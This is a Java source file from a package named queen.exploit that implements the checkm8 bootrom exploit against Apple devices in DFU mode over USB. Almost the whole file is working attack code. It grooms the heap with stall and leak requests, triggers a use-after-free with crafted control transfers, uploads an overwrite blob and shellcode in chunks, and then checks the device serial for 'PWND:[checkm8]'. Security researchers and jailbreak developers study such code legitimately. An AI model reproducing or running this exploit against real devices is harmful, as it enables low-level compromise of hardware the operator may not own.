package queen.exploit;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.io.HexDump;
import org.usb4java.BufferUtils;
import org.usb4java.LibUsb;

import queen.device.DeviceConfig;
import queen.device.ExploitConfig;
import queen.dfu.Dfu;
import queen.dfu.EventHandlingThread;

public class Exploit {
	private static byte[] a800 = new byte[0x800];
	private static final int MAX_PACKET_SIZE = 0x800;
	
    public static void runCheckm8() {
//    	LibUsb.MAX
    	Arrays.fill(a800, (byte)0x41);
        Dfu dfu = new Dfu();

        // For async io
        EventHandlingThread asyncIOThread = new EventHandlingThread();
        asyncIOThread.start();

        DeviceConfig deviceConfig = new DeviceConfig(
            "iBoot-3332.0.0.1.23",
            0x8015,
            0,
            ByteBuffer.allocate(0).array(),
            0x500L,
            6,
            1
        );
        
        ExploitConfig exploitConfig = new ExploitConfig(deviceConfig);

        try {
//            byte[] shellcode = exploitConfig.payload();
        	byte[] shellcode = exploitConfig.loadBinary("shellcode");

            dfu.aquireDevice();

//            if (deviceConfig.getLargeLeak() > 0) {
//                dfu.usbReqStall();
//                for (int i = 0; i < deviceConfig.getLargeLeak(); i++) {
//                    dfu.usbReqLeak();
//                }
//                dfu.usbReqNoLeak();
//            } else {
//                dfu.stall();
//                for (int i = 0; i < deviceConfig.getHole(); i++) {
//                    dfu.noLeak();
//                }
//                dfu.usbReqLeak();
//                dfu.noLeak();
//            }
            dfu.stall();
            
            for (int i = 0; i < deviceConfig.getHole(); i++) {
                dfu.noLeak();
            }
            dfu.usbReqLeak();
            dfu.noLeak();

            dfu.resetDevice();
            dfu.releaseDevice();

            dfu.aquireDevice();
            dfu.asyncCtrlTransfer((byte)0x21, (byte)1, (short)0, (short)0, a800, 0.00001);
            
            
            // Advance buffer offset before triggering the UaF to prevent trashing the heap
//            byte[] bufferOffset = new byte[deviceConfig.getOverwriteOffset().intValue()];
//            dfu.noErrorCtrlTransfer((byte)0, (byte)0, (short)0, (short)0, bufferOffset, 10l);
            
            byte[] zero = new byte[0];
            dfu.noErrorCtrlTransfer((byte)0x21, (byte)4, (short)0, (short)0, zero, 0l);
            dfu.releaseDevice();

            TimeUnit.MILLISECONDS.sleep(500l);

            dfu.aquireDevice();
            dfu.usbReqStall();

//            if (deviceConfig.getLargeLeak() > 0) {
//                dfu.usbReqLeak();
//            } else {
//                for(int i = 0; i < deviceConfig.getLeak(); i++) {
//                    dfu.usbReqLeak();
//                }
//            }
            
            for(int i = 0; i < deviceConfig.getLeak(); i++) {
                dfu.usbReqLeak();
            }
//            ByteBuffer ovBuffer = ByteBuffer.allocateDirect(0x500 + 128);
//            ovBuffer.put(exploitConfig.createOverwrite(deviceConfig.getNopGadget(), 0x18001C020l));
//            byte[] overwrite = exploitConfig.createOverwrite(deviceConfig.getNopGadget(), 0x18001C020l);
            byte[] overwrite = exploitConfig.loadBinary("overwrite");
            System.out.println("shellcode: " + shellcode.length + " overwrite: " + overwrite.length);
            
//            for (int i = 0; i < overwrite.length; i += 0x800) {
//            	int amountToCopy = (i + 0x800) > overwrite.length ? (overwrite.length - i) : 0x800;
//                byte[] temp = Arrays.copyOfRange(overwrite, i, i + amountToCopy);
//                
//            }
            dfu.noErrorCtrlTransfer((byte)0x21, (byte)1, (short)0, (short)0, overwrite, 50l);
            

//            TimeUnit.MILLISECONDS.sleep(100l);
            
            for (int i = 0; i < shellcode.length; i += MAX_PACKET_SIZE) {
            	int amountToCopy = (i + MAX_PACKET_SIZE) > shellcode.length ? (shellcode.length - i) : MAX_PACKET_SIZE;
                byte[] temp = Arrays.copyOfRange(shellcode, i, i + amountToCopy);
                
                dfu.noErrorCtrlTransfer((byte)0x21, (byte)1, (short)0, (short)0, temp, 200l);
            }
//            dfu.noErrorCtrlTransfer((byte)0x21, (byte)1, (short)0, (short)0, shellcode, 100l);

            dfu.resetDevice();
            dfu.releaseDevice();

            dfu.aquireDevice();
            if (!dfu.getSerial().contains("PWND:[checkm8]")) {
                System.out.println("Exploit failed");
                System.out.println(dfu.getSerial());
                System.exit(-1);
            }
        } catch (InterruptedException e) {
            System.out.println(e.getLocalizedMessage());
            e.printStackTrace();
//        } catch (IOException e1) {
//            System.out.println(e1.getLocalizedMessage());
//            e1.printStackTrace();
        } finally {
            asyncIOThread.abort();
            try {
                asyncIOThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
//             dfu.releaseDevice();
        }
    }
}
